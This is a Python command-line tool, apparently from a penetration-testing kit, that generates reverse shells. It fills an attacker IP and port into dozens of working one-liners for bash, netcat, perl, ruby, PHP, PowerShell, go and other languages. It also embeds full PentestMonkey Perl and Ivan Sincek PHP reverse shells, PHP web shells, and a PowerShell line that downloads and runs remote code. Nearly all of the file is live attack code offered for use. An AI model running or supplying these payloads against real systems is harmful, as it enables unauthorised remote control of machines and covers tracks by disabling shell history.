#!/usr/bin/env python3

import argparse
from base64 import b64encode
import sys
from collections import defaultdict
import re
import textwrap
from rich.console import Console
import pyperclip
import os

def generate_shells():
    return {

        # OpenSSL Reverse Shell
        'openssl-linux-oneline': "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect __IPADDR__:__PORT__ > /tmp/s; rm /tmp/s",

        # Perl Reverse Shells
        'perl-tcp-linux-oneline': "perl -e 'use Socket;$i=\"__IPADDR__\";$p=__PORT__;"
                    "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                    "if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
                    "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                    "exec(\"/bin/sh -i\");}};'",

        'perl-io-linux-oneline': "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"__IPADDR__:__PORT__\");"
                   "STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
        
        
        # Ruby Reverse Shells
        'ruby-tcp-linux-oneline': "ruby -rsocket -e 'f=TCPSocket.open(\"__IPADDR__\",__PORT__).to_i;"
                    "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",

        'ruby-tcp-windows-oneline': "ruby -rsocket -e 'c=TCPSocket.new(\"__IPADDR__\",\"__PORT__\");"
                        "while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",

        # Netcat Reverse Shells
        'nc-mkfifo-linux-oneline': "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc __IPADDR__ __PORT__ >/tmp/f",
        'nc-c-linux-oneline': "nc -c /bin/sh __IPADDR__ __PORT__",
        "nc-c-windows-oneline": "nc.exe -e cmd.exe __IPADDR__ __PORT__",
        'nc-mknod-linux-oneline': "rm -f /tmp/p; mknod /tmp/p p && nc __IPADDR__ __PORT__ 0/tmp/p",
        

        # Socat Reverse Shells
        'socat-linux-exec-oneline': "/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:__IPADDR__:__PORT__",
        
        # AWK Reverse Shell
        'awk-linux-oneline': "awk 'BEGIN {{s = \"/inet/tcp/0/__IPADDR__/__PORT__\"; while(42) {{"
               "do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ "
               "while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}' /dev/null",

        # Rustcat Reverse Shell
        'rustcat-linux-oneline': "rcat connect -s bash __IPADDR__ __PORT__",

        # Tclsh Reverse Shell
        'tclsh-linux-oneline': "echo 'set s [socket __IPADDR__ __PORT__];while 42 {{ puts -nonewline $s \"shell>\";flush $s;gets $s c;"
                 "set e \"exec $c\";if {{![catch {{set r [eval $e]}} err]}} {{ puts $s $r }}; flush $s; }}; close $s;' | tclsh"
    }

def generate_php_ivan_sincek_reverse_shell():
    return {
        "php-ivan-sincek-reverse-shell-osx": """<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.

class Shell {{
    private $addr  = '__IPADDR__';
    private $port  = __PORT__;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), 
        1 => array('pipe', 'w'), 
        2 => array('pipe', 'w')  
    );
    private $buffer  = 1024;
    private $clen    = 0;
    private $error   = false;

    public function __construct($addr, $port) {{
        $this->addr = $addr;
        $this->port = $port;
    }}

    private function detect() {{
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) {{ 
            $this->os    = 'LINUX';
            $this->shell = 'cmd';
        }} else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {{
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        }} else {{
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n";
        }}
        return $detected;
    }}

    private function daemonize() {{
        $exit = false;
        if (!function_exists('pcntl_fork')) {{
            echo "DAEMONIZE: pcntl_fork() does not exist, moving on...\\n";
        }} else if (($pid = @pcntl_fork()) < 0) {{
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\\n";
        }} else if ($pid > 0) {{
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n";
        }} else if (posix_setsid() < 0) {{
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n";
        }} else {{
            echo "DAEMONIZE: Completed successfully!\\n";
        }}
        return $exit;
    }}

    private function settings() {{
        @error_reporting(0);
        @set_time_limit(0);
        @umask(0);
    }}

    private function read($stream, $name, $buffer) {{
        if (($data = @fread($stream, $buffer)) === false) {{
            $this->error = true;
            echo "STRM_ERROR: Cannot read from $name, script will now exit...\\n";
        }}
        return $data;
    }}

    private function write($stream, $name, $data) {{
        if (($bytes = @fwrite($stream, $data)) === false) {{
            $this->error = true;
            echo "STRM_ERROR: Cannot write to $name, script will now exit...\\n";
        }}
        return $bytes;
    }}

    private function rw($input, $output, $iname, $oname) {{
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {{
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') {{ $this->clen += strlen($data); }} 
        }}
    }}

    public function run() {{
        if ($this->detect() && !$this->daemonize()) {{
            $this->settings();

            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {{
                echo "SOC_ERROR: $errno: $errstr\\n";
            }} else {{
                stream_set_blocking($socket, false);

                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {{
                    echo "PROC_ERROR: Cannot start the shell\\n";
                }} else {{
                    foreach ($pipes as $pipe) {{
                        stream_set_blocking($pipe, false);
                    }}

                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\\n");

                    do {{
                        $status = proc_get_status($process);
                        if (feof($socket)) {{
                            echo "SOC_ERROR: Shell connection has been terminated\\n"; break;
                        }} else if (feof($pipes[1]) || !$status['running']) {{                 
                            echo "PROC_ERROR: Shell process has been terminated\\n";   break; 
                        }}                                                                    

                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), 
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); 

                        if ($num_changed_streams === false) {{
                            echo "STRM_ERROR: stream_select() failed\\n"; break;
                        }} else if ($num_changed_streams > 0) {{
                            if ($this->os === 'LINUX') {{
                                if (in_array($socket  , $streams['read'])) {{ $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }}
                                if (in_array($pipes[2], $streams['read'])) {{ $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }}
                                if (in_array($pipes[1], $streams['read'])) {{ $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }}
                            }} else if ($this->os === 'WINDOWS') {{
                                if (in_array($socket, $streams['read'])/*------*/) {{ $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }}
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) {{ $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }}
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) {{ $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }}
                            }}
                        }}
                    }} while (!$this->error);

                    foreach ($pipes as $pipe) {{
                        fclose($pipe);
                    }}
                    proc_close($process);
                }}

                fclose($socket);
            }}
        }}
    }}
}}

echo '<pre>';
$sh = new Shell('__IPADDR__', __PORT__);
$sh->run();
unset($sh);
echo '</pre>';
?>
"""
    }


def generate_php_web_shell():
    return {
        "php-web-shell-osx-1": """<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>""",

        "php-web-shell-osx-2": """<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>"""

    }

def generate_powershell_reverse_shells():
    return {
        "powershell-windows-conpty-oneline": """IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell __IPADDR__ __PORT__""",

        # Netcat for Windows
        "nc-e-windows-oneline": "nc.exe __IPADDR__ __PORT__ -e cmd"

    }

def generate_bash_reverse_shells():
    return {
        # Basic Bash Reverse Shells
        "bash-tcp-1-linux-oneline": "/bin/bash -i >& /dev/tcp/__IPADDR__/__PORT__ 0>&1",
        "bash-tcp-2-lunix-oneline": "0<&196;exec 196<>/dev/tcp/__IPADDR__/__PORT__; /bin/bash <&196 >&196 2>&196",
        "bash-tcp-3-linux-oneline": "exec 5<>/dev/tcp/__IPADDR__/__PORT__;cat <&5 | while read line; do $line 2>&5 >&5; done",
        "bash-tcp-4-linux-oneline": "/bin/bash -i 5<> /dev/tcp/__IPADDR__/__PORT__ 0<&5 1>&5 2>&5",
        "bash-udp-linux-oneline": "/bin/bash -i >& /dev/udp/__IPADDR__/__PORT__ 0>&1",

        # Netcat Reverse Shells
        "nc-mkfifo-linux-oneline": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc __IPADDR__ __PORT__ >/tmp/f",
        "nc-bash--linux-oneline": "nc __IPADDR__ __PORT__ -e /bin/bash",
        "busybox-linux-nc-online": "busybox nc __IPADDR__ __PORT__ -e /bin/bash",
        "nc-c-linux-oneline": "nc -c /bin/bash __IPADDR__ __PORT__",
        "nc-udp-linux-oneline": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -u __IPADDR__ __PORT__ >/tmp/f",

        # Curl Reverse Shell
        "curl-linux-oneline": "C='curl -Ns telnet://__IPADDR__:__PORT__'; $C </dev/null 2>&1 | /bin/bash 2>&1 | $C >/dev/null",

        # Rustcat Reverse Shell
        "rustcat-linux-oneline": "rcat connect -s /bin/bash __IPADDR__ __PORT__",
        "rustcat-windows-oneline": "rcat connect -s cmd.exe __IPADDR__ __PORT__"
    }

def generate_perl_reverse_shells():
    return {

        # Full Perl Reverse Shell Script (PentestMonkey)
        "perl-pentestmonkey-linux": """#!/usr/bin/perl -w
# perl-reverse-shell - A Reverse Shell implementation in PERL
# Copyright (C) 2006 pentestmonkey@pentestmonkey.net

use strict;
use Socket;
use FileHandle;
use POSIX;

# Reverse Shell Target Configuration
my $ip = '__IPADDR__';
my $port = __PORT__;

# Background Daemon Process
my $daemon = 1;

# Fork process to detach from parent
if ($daemon) {
    my $pid = fork();
    if ($pid) { exit(0); }
    setsid();
    chdir('/');
    umask(0);
}

# Open TCP Connection for Reverse Shell
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
    print("Connected to $ip:$port\n");
} else {
    print("Failed to connect: $!\n");
    exit(1);
}

# Redirect STDIN, STDOUT, STDERR to the TCP socket
open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");

# Execute Interactive Bash Shell
$ENV{'HISTFILE'} = '/dev/null';
exec("/bin/bash -i");
""",
    }

def generate_mixed_reverse_shells():
    return {
        # PHP Reverse Shells
        "php-exec-osx-oneline": """php -r '$sock=fsockopen("10.0.0.1",3333); $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === "WIN") ? "cmd.exe /K" : "/bin/sh -i"; shell_exec($cmd);'""",
        "php-system-osx-oneline": """php -r '$sock=fsockopen("__IPADDR__",__PORT__); $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === "WIN") ? "cmd.exe /K" : "/bin/sh -i"; system($cmd);'""",
        "php-backticks-osx-oneline": """php -r '$sock=fsockopen("10.0.0.1",3333); $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === "WIN") ? "cmd.exe /K" : "/bin/sh -i"; `$cmd`;'""",
        "php-proc_open-osx-oneline": """php -r '$sock=fsockopen("10.0.0.1",3333);$cmd=(stripos(PHP_OS,"WIN")===0)?"cmd.exe":"/bin/sh";proc_open($cmd,[0=>$sock,1=>$sock,2=>$sock],$pipes);'""",

        # Ruby Reverse Shells
        "ruby-rsocket-linux-oneline": """ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("__IPADDR__",__PORT__))'""",
        "ruby-rsocket-windows-oneline": """ruby -rsocket -e 'spawn("cmd.exe", [:in, :out, :err]=>TCPSocket.new("__IPADDR__",__PORT__))'"""
    }

def generate_sqlite_node_java_shells():
    return {
        # SQLite Reverse Shell
        "sqlite-shell-linux-oneline": """sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc __IPADDR__ __PORT__ >/tmp/f'"""

    }

def generate_jsp_js_telnet_zsh_lua_shells():
    return {

        # Telnet Reverse Shell
        "telnet-reverse-linux-oneline": """TF=$(mktemp -u);mkfifo $TF && telnet __IPADDR__ __PORT__ 0<$TF | /bin/bash 1>$TF""",

        # Zsh Reverse Shell
        "zsh-reverse-shell-linux-oneline": """zsh -c 'zmodload zsh/net/tcp && ztcp __IPADDR__ __PORT__ && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'""",

        # Lua Reverse Shells
        "lua-exec-linux-oneline": """lua -e "require('socket');require('os');t=socket.tcp();t:connect('__IPADDR__','__PORT__');os.execute('/bin/bash -i <&3 >&3 2>&3');" """,
    }

def generate_go_v_awk_dart_crystal_shells():
    return {
        # Go Reverse Shell
        "go-reverse-shell-linux-oneline": """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","__IPADDR__:__PORT__"); cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go""",

        # V Language Reverse Shell
        "v-nc-reverse-shell-linux-oneline": """echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e /bin/bash __IPADDR__ __PORT__ 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v"""

    }

    return {name: generate_shell(ipaddr, port, cmd) for name, cmd in shells.items()}

SHELLCODE_DIR = os.path.expanduser("/home/kali/VforMSF/shellscript/") #********CHANGE THIS LINE TO WHERE /shellscript is installed on your OS***********

def parse_options():
    parser = argparse.ArgumentParser(description="Reverse Shell Generator - CLI Tool")
    parser.add_argument("-i", "--ipaddr", type=str, help="IP address to connect back to")
    parser.add_argument("-p", "--port", type=int, help="Port to connect back to (1-65535)")
    parser.add_argument("-t", "--type", type=str, help="Type of reverse shell to generate", dest="shell_type")
    parser.add_argument("-l", "--list", action="store_true", help="List available shell types")
    parser.add_argument("-a", "--all", action="store_true", help="Generate all available reverse shells")

    args = parser.parse_args()

    if args.port and not (1 <= args.port <= 65535):
        parser.error("Port number must be between 1 and 65535")

    return args

def generate_shell(ipaddr, port, template):
    """Replace placeholders with actual values."""
    return template.replace("__IPADDR__", ipaddr).replace("__PORT__", str(port))

def load_shellcode_from_directory():
    """Search for shell scripts in the shellcode directory and load them."""
    shellcode_shells = {}

    if not os.path.exists(SHELLCODE_DIR):
        print(f"[-] Warning: Shellcode directory '{SHELLCODE_DIR}' not found!")
        return {}

    for filename in os.listdir(SHELLCODE_DIR):
        filepath = os.path.join(SHELLCODE_DIR, filename)
        if os.path.isfile(filepath):
            try:
                with open(filepath, "r", encoding="utf-8") as file:
                    shellcode_shells[filename] = file.read().strip()
            except Exception as e:
                print(f"[-] Error reading '{filename}': {e}")

    return shellcode_shells

def main():
    args = parse_options()

    # Define exceptions with their specific mappings
    exception_mappings = {
        "c": {"c-reverse-shell-linux-c-code.txt", "c-reverse-shell-windows-winsock.txt"},
        "csharp": {"csharp-reverse-osx-1.txt", "csharp-reverse-osx-2.txt"},
        "java": {"java-process-builder.txt", "java-windows-reverse-shell.txt", "java-rmi-reverse-shell.txt", "java-runtime-exec.txt"},
        "rust": {"rust.txt"},
    }

    # Load built-in shells
    shells = {}
    shells.update(generate_shells())
    shells.update(generate_powershell_reverse_shells())
    shells.update(generate_bash_reverse_shells())
    shells.update(generate_perl_reverse_shells())
    shells.update(generate_go_v_awk_dart_crystal_shells())
    shells.update(generate_jsp_js_telnet_zsh_lua_shells())
    shells.update(generate_php_ivan_sincek_reverse_shell())
    shells.update(generate_php_web_shell())
    shells.update(generate_mixed_reverse_shells())
    shells.update(generate_sqlite_node_java_shells())

    # Load additional shells from directory
    shells.update(load_shellcode_from_directory())  # Merge file-based shells

    # Format the shell templates after merging
    if args.ipaddr and args.port:
        shells = {name: generate_shell(args.ipaddr, args.port, cmd) for name, cmd in shells.items()}

    if args.list:
        print("\n[+] Available Shell Types:\n")
        grouped_shells = {}

        for shell_name in sorted(shells.keys()):
            category = shell_name.split('-')[0]  # Extract prefix (e.g., "bash", "php")
            description = shell_name.replace(category, "").strip("-") or "Default"
            grouped_shells.setdefault(category, []).append((shell_name, description))

        # Print grouped shell types with descriptions
        for category, shell_variants in grouped_shells.items():
            print(f"{category.capitalize()}:")

            for shell_name, desc in shell_variants:
                desc_text = f" ({desc})" if desc != "Default" else ""
                print(f"  - {shell_name}{desc_text}")  # Generalized name with descriptions

            print()  # Spacing for readability
        return

    # Handle `-t` (`--type`) to find shells
    if args.shell_type:
        shell_type_input = args.shell_type.lower()

        if shell_type_input in exception_mappings:
            matching_shells = {
                name: cmd for name, cmd in shells.items()
                if name in exception_mappings[shell_type_input]
            }
        else:
            matching_shells = {
                name: cmd for name, cmd in shells.items()
                if name.startswith(shell_type_input)
            }

        if matching_shells:
            print(f"\n[+] Reverse shells matching '{args.shell_type}':\n")
            for name, command in matching_shells.items():
                print(f"[{name}]\n---\n{command}\n---\n")
        else:
            print(f"\n[-] No matching shells found for: {args.shell_type}")
            print("[*] Use --list to see available shell types.")

if __name__ == "__main__":
    main()

